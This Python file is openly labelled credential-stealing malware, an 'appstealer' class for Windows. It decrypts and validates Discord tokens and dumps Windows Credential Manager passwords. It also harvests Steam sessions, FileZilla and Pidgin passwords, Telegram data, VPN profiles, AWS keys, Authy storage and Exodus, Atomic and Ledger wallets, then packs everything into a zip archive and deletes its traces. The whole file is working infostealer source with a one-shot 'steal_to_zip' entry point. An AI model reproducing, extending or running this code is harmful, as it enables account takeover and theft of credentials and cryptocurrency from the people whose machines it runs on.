import os
import re
import json
import base64
import shutil
import zipfile
import ctypes
import tempfile
import urllib.request
import winreg
from pathlib import Path
from datetime import datetime
import xml.etree.ElementTree as et

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    ca = True
except ImportError:
    ca = False


class appstealer:
    def __init__(s, op=None):
        # init paths and result containers
        s.op = op or os.path.join(
            tempfile.gettempdir(),
            f"app_steal_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        )
        s.td = Path(tempfile.mkdtemp())
        s.dc = []   # discord tokens
        s.va = []   # vault creds
        s.ap = []   # app creds
        s.md = {
            "timestamp": datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME", "unknown"),
            "username": os.environ.get("USERNAME", "unknown"),
            "apps_found": [],
            "errors": []
        }

    # public api
    def run(s):
        # run all extraction modules and package
        if not ca:
            s.md["errors"].append("cryptography missing install pip install cryptography")
        s._dc()
        s._vt()
        s._st()
        s._fz()
        s._tg()
        s._vn()
        s._bn()
        s._aw()
        s._pg()
        s._ay()
        s._wl()
        return s._pkg()

    def extract_only(s):
        # run without packaging
        if ca:
            s._dc()
        s._vt()
        s._st()
        s._fz()
        s._tg()
        s._vn()
        s._bn()
        s._aw()
        s._pg()
        s._ay()
        s._wl()
        return s.dc, s.va, s.ap, s.md

    # crypto utils
    def _dpd(s, b):
        # dpapi decrypt blob via ctypes
        class db(ctypes.Structure):
            _fields_ = [("sz", ctypes.c_uint32), ("pt", ctypes.c_void_p)]
        bi = db(len(b), ctypes.cast(b, ctypes.c_void_p))
        bo = db()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)
        ):
            r = ctypes.string_at(bo.pt, bo.sz)
            ctypes.windll.kernel32.LocalFree(bo.pt)
            return r
        return None

    def _gmk(s, lp):
        # get discord master key from local state json
        try:
            with open(lp, "r", encoding="utf-8") as f:
                d = json.load(f)
            ek = base64.b64decode(d["os_crypt"]["encrypted_key"])
            ek = ek[5:]
            return s._dpd(ek)
        except Exception as e:
            s.md["errors"].append(f"gmk fail {lp} {e}")
            return None

    def _dt(s, mk, mt):
        # decrypt discord token from dqw4w9wgxcq match
        try:
            b64 = mt.split("dQw4w9WgXcQ:")[1]
            eb = base64.b64decode(b64)
            if eb[:3] == b'v10' or eb[:3] == b'v11':
                eb = eb[3:]
            if len(eb) < 28:
                return None
            iv = eb[:12]
            ct = eb[12:]
            ag = AESGCM(mk)
            pt = ag.decrypt(iv, ct, None)
            return pt.decode('utf-8', errors='ignore')
        except Exception:
            return None

    def _vtok(s, t):
        # validate token via discord api
        try:
            r = urllib.request.Request(
                "https://discord.com/api/v9/users/@me",
                headers={"Authorization": t}
            )
            with urllib.request.urlopen(r, timeout=5) as rs:
                return json.loads(rs.read().decode())
        except Exception:
            return None

    # discord module
    def _dc(s):
        # extract tokens from all discord variants
        ad = os.environ.get("APPDATA", "")
        ld = os.environ.get("LOCALAPPDATA", "")
        vs = [
            ("discord", ad), ("discordcanary", ad), ("discordptb", ad),
            ("discorddevelopment", ad), ("lightcord", ad),
            ("discord", ld), ("discordcanary", ld), ("discordptb", ld),
            ("discorddevelopment", ld), ("lightcord", ld),
        ]
        for vn, bp in vs:
            bp = os.path.join(bp, vn)
            if not os.path.exists(bp):
                continue
            s.md["apps_found"].append(vn)
            ls = os.path.join(bp, "Local State")
            ldb = os.path.join(bp, "Local Storage", "leveldb")
            mk = None
            if os.path.exists(ls) and ca:
                mk = s._gmk(ls)
            if os.path.exists(ldb):
                s._et(ldb, mk, vn)

    def _et(s, dp, mk, vn):
        # extract tokens from leveldb log and ldb files
        rx = [
            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,100}",
            r"mfa\.[\w-]{84,100}",
        ]
        er = r'dQw4w9WgXcQ:[^\"]*'
        fd = set()
        for fn in os.listdir(dp):
            if not fn.endswith((".log", ".ldb")):
                continue
            fp = os.path.join(dp, fn)
            try:
                with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                    for ln in f:
                        for m in re.finditer(er, ln):
                            if mk:
                                t = s._dt(mk, m.group())
                                if t and t not in fd:
                                    fd.add(t)
                                    s._at(t, vn)
                        for p in rx:
                            for m in re.finditer(p, ln):
                                t = m.group()
                                if t not in fd:
                                    fd.add(t)
                                    s._at(t, vn)
            except Exception:
                pass

    def _at(s, t, vn):
        # add token with api validation
        i = s._vtok(t)
        if i:
            s.dc.append({
                "variant": vn,
                "token": t,
                "user": i.get("username", ""),
                "id": str(i.get("id", "")),
                "email": i.get("email", ""),
                "phone": i.get("phone", ""),
                "nitro": i.get("premium_type", 0),
                "mfa": i.get("mfa_enabled", False),
            })
        else:
            s.dc.append({
                "variant": vn,
                "token": t,
                "valid": False,
            })

    # windows credential manager
    def _vt(s):
        # dump windows vault via credenumeratew
        class cr(ctypes.Structure):
            _fields_ = [
                ("f", ctypes.c_uint32),
                ("t", ctypes.c_uint32),
                ("tn", ctypes.c_wchar_p),
                ("c", ctypes.c_wchar_p),
                ("lw", ctypes.c_uint64),
                ("cbs", ctypes.c_uint32),
                ("cb", ctypes.c_void_p),
                ("p", ctypes.c_uint32),
                ("ac", ctypes.c_uint32),
                ("a", ctypes.c_void_p),
                ("ta", ctypes.c_wchar_p),
                ("un", ctypes.c_wchar_p),
            ]
        cn = ctypes.c_uint32()
        ca = ctypes.POINTER(ctypes.POINTER(cr))()
        if not ctypes.windll.advapi32.CredEnumerateW(None, 0, ctypes.byref(cn), ctypes.byref(ca)):
            return
        for i in range(cn.value):
            c = ca[i][0]
            if c.cbs > 0 and c.cb:
                b = ctypes.string_at(c.cb, c.cbs)
                pt = s._dpd(b)
                if pt:
                    s.va.append({
                        "target": c.tn or "",
                        "user": c.un or "",
                        "pass": pt.decode('utf-8', errors='ignore'),
                        "type": c.t,
                    })
        ctypes.windll.advapi32.CredFree(ca)

    # steam
    def _st(s):
        # extract steam config and session files
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam") as k:
                sp = winreg.QueryValueEx(k, "SteamPath")[0]
        except Exception:
            return
        if not os.path.exists(sp):
            return
        s.md["apps_found"].append("steam")
        for fn in os.listdir(sp):
            if fn.startswith("ssfn"):
                try:
                    shutil.copy2(os.path.join(sp, fn), s.td / f"steam_{fn}")
                except Exception:
                    pass
        lu = os.path.join(sp, "config", "loginusers.vdf")
        if os.path.exists(lu):
            d = s._pv(lu)
            if d:
                s.ap.append({"app": "steam", "type": "loginusers", "data": d})
        cv = os.path.join(sp, "config", "config.vdf")
        if os.path.exists(cv):
            try:
                shutil.copy2(cv, s.td / "steam_config.vdf")
            except Exception:
                pass

    def _pv(s, fp):
        # parse steam vdf simply
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                d = f.read()
            r = {}
            for m in re.finditer(r'"AccountName"\s+"([^"]+)"', d):
                r["account"] = m.group(1)
            for m in re.finditer(r'"PersonaName"\s+"([^"]+)"', d):
                r["persona"] = m.group(1)
            for m in re.finditer(r'"SteamID"\s+"(\d+)"', d):
                r["steamid"] = m.group(1)
            return r
        except Exception:
            return {}

    # filezilla
    def _fz(s):
        # extract filezilla server configs
        ad = os.environ.get("APPDATA", "")
        fp = os.path.join(ad, "FileZilla")
        if not os.path.exists(fp):
            return
        s.md["apps_found"].append("filezilla")
        sm = os.path.join(fp, "sitemanager.xml")
        rs = os.path.join(fp, "recentservers.xml")
        for pt, tp in [(sm, "sitemanager"), (rs, "recent")]:
            if os.path.exists(pt):
                for sv in s._fx(pt):
                    s.ap.append({
                        "app": "filezilla",
                        "type": tp,
                        "host": sv.get("host"),
                        "user": sv.get("user"),
                        "pass": sv.get("pass"),
                        "port": sv.get("port"),
                    })

    def _fx(s, fp):
        # parse filezilla xml
        try:
            t = et.parse(fp)
            r = []
            for sv in t.findall(".//Server"):
                h = sv.find("Host")
                u = sv.find("User")
                p = sv.find("Pass")
                pt = sv.find("Port")
                r.append({
                    "host": h.text if h is not None else "",
                    "user": u.text if u is not None else "",
                    "pass": p.text if p is not None else "",
                    "port": pt.text if pt is not None else "21",
                })
            return r
        except Exception:
            return []

    # telegram
    def _tg(s):
        # copy telegram tdata for offline processing
        ad = os.environ.get("APPDATA", "")
        tp = os.path.join(ad, "Telegram Desktop", "tdata")
        if not os.path.exists(tp):
            return
        s.md["apps_found"].append("telegram")
        try:
            shutil.copytree(tp, s.td / "telegram_tdata", dirs_exist_ok=True)
        except Exception:
            pass

    # vpn apps
    def _vn(s):
        # extract openvpn and protonvpn configs
        ad = os.environ.get("APPDATA", "")
        op = os.path.join(ad, "OpenVPN Connect", "profiles")
        if os.path.exists(op):
            s.md["apps_found"].append("openvpn")
            for fn in os.listdir(op):
                if fn.endswith(".ovpn"):
                    try:
                        shutil.copy2(os.path.join(op, fn), s.td / f"ovpn_{fn}")
                    except Exception:
                        pass
        pp = os.path.join(ad, "ProtonVPN")
        if os.path.exists(pp):
            s.md["apps_found"].append("protonvpn")
            uc = os.path.join(pp, "user.config")
            if os.path.exists(uc):
                try:
                    shutil.copy2(uc, s.td / "protonvpn_user.config")
                except Exception:
                    pass

    # battlenet
    def _bn(s):
        # copy battlenet db and config files
        ad = os.environ.get("APPDATA", "")
        bp = os.path.join(ad, "Battle.net")
        if not os.path.exists(bp):
            return
        s.md["apps_found"].append("battlenet")
        for fn in os.listdir(bp):
            if fn.endswith((".db", ".config")):
                try:
                    shutil.copy2(os.path.join(bp, fn), s.td / f"bnet_{fn}")
                except Exception:
                    pass

    # aws
    def _aw(s):
        # extract aws credentials file
        hp = os.path.expanduser("~")
        cp = os.path.join(hp, ".aws", "credentials")
        if not os.path.exists(cp):
            return
        s.md["apps_found"].append("aws")
        d = s._ac(cp)
        for pr, cd in d.items():
            s.ap.append({
                "app": "aws",
                "profile": pr,
                "key": cd.get("aws_access_key_id", ""),
                "secret": cd.get("aws_secret_access_key", ""),
            })

    def _ac(s, fp):
        # parse aws credentials ini style
        try:
            r = {}
            cp = None
            with open(fp, "r", encoding="utf-8") as f:
                for ln in f:
                    ln = ln.strip()
                    if ln.startswith("[") and ln.endswith("]"):
                        cp = ln[1:-1]
                        r[cp] = {}
                    elif cp and "=" in ln:
                        k, v = ln.split("=", 1)
                        r[cp][k.strip()] = v.strip()
            return r
        except Exception:
            return {}

    # pidgin
    def _pg(s):
        # extract pidgin accounts xml
        ad = os.environ.get("APPDATA", "")
        pp = os.path.join(ad, ".purple", "accounts.xml")
        if not os.path.exists(pp):
            return
        s.md["apps_found"].append("pidgin")
        for a in s._px(pp):
            s.ap.append({
                "app": "pidgin",
                "protocol": a.get("protocol"),
                "user": a.get("name"),
                "pass": a.get("pass"),
            })

    def _px(s, fp):
        # parse pidgin xml
        try:
            t = et.parse(fp)
            r = []
            for a in t.findall(".//account"):
                p = a.find("protocol")
                n = a.find("name")
                pw = a.find("password")
                r.append({
                    "protocol": p.text if p is not None else "",
                    "name": n.text if n is not None else "",
                    "pass": pw.text if pw is not None else "",
                })
            return r
        except Exception:
            return []

    # authy desktop
    def _ay(s):
        # copy authy leveldb
        ad = os.environ.get("APPDATA", "")
        ap = os.path.join(ad, "Authy Desktop", "Local Storage", "leveldb")
        if not os.path.exists(ap):
            return
        s.md["apps_found"].append("authy")
        try:
            shutil.copytree(ap, s.td / "authy_leveldb", dirs_exist_ok=True)
        except Exception:
            pass

    # crypto wallets
    def _wl(s):
        # extract exodus atomic ledger and others
        ad = os.environ.get("APPDATA", "")
        ep = os.path.join(ad, "Exodus")
        if os.path.exists(ep):
            s.md["apps_found"].append("exodus")
            for fn in ["exodus.conf.json", "window-state.json"]:
                fp = os.path.join(ep, fn)
                if os.path.exists(fp):
                    try:
                        shutil.copy2(fp, s.td / f"exodus_{fn}")
                    except Exception:
                        pass
            wp = os.path.join(ep, "exodus.wallet")
            if os.path.exists(wp):
                try:
                    shutil.copytree(wp, s.td / "exodus_wallet", dirs_exist_ok=True)
                except Exception:
                    pass
        at = os.path.join(ad, "atomic", "Local Storage", "leveldb")
        if os.path.exists(at):
            s.md["apps_found"].append("atomic")
            try:
                shutil.copytree(at, s.td / "atomic_leveldb", dirs_exist_ok=True)
            except Exception:
                pass
        ll = os.path.join(ad, "Ledger Live")
        if os.path.exists(ll):
            s.md["apps_found"].append("ledger")
            try:
                shutil.copytree(ll, s.td / "ledger_live", dirs_exist_ok=True)
            except Exception:
                pass

    # packaging
    def _pkg(s):
        # write jsons and zip everything
        dj = s.td / "discord.json"
        vj = s.td / "vault.json"
        aj = s.td / "apps.json"
        mj = s.td / "metadata.json"
        with open(dj, "w", encoding="utf-8") as f:
            json.dump(s.dc, f, indent=2, ensure_ascii=False)
        with open(vj, "w", encoding="utf-8") as f:
            json.dump(s.va, f, indent=2, ensure_ascii=False)
        with open(aj, "w", encoding="utf-8") as f:
            json.dump(s.ap, f, indent=2, ensure_ascii=False)
        with open(mj, "w", encoding="utf-8") as f:
            json.dump(s.md, f, indent=2, ensure_ascii=False)
        with zipfile.ZipFile(s.op, 'w', zipfile.ZIP_DEFLATED) as z:
            z.write(dj, "discord.json")
            z.write(vj, "vault.json")
            z.write(aj, "apps.json")
            z.write(mj, "metadata.json")
            for it in s.td.iterdir():
                if it.name in ["discord.json", "vault.json", "apps.json", "metadata.json"]:
                    continue
                if it.is_file():
                    z.write(it, f"raw/{it.name}")
                elif it.is_dir():
                    for rf in it.rglob("*"):
                        if rf.is_file():
                            z.write(rf, f"raw/{it.name}/{rf.relative_to(it).as_posix()}")
        try:
            shutil.rmtree(s.td)
        except Exception:
            pass
        return s.op


# convenience api
def steal_to_zip(op=None):
    # one shot extraction to zip
    s = appstealer(op)
    return s.run()


if __name__ == "__main__":
    s = appstealer()
    o = s.run()
    print(f"[+] zip saved to {o}")
    print(f"[+] discord tokens {len(s.dc)}")
    print(f"[+] vault creds {len(s.va)}")
    print(f"[+] app creds {len(s.ap)}")
    if s.md["errors"]:
        print(f"[!] errors {s.md['errors']}")
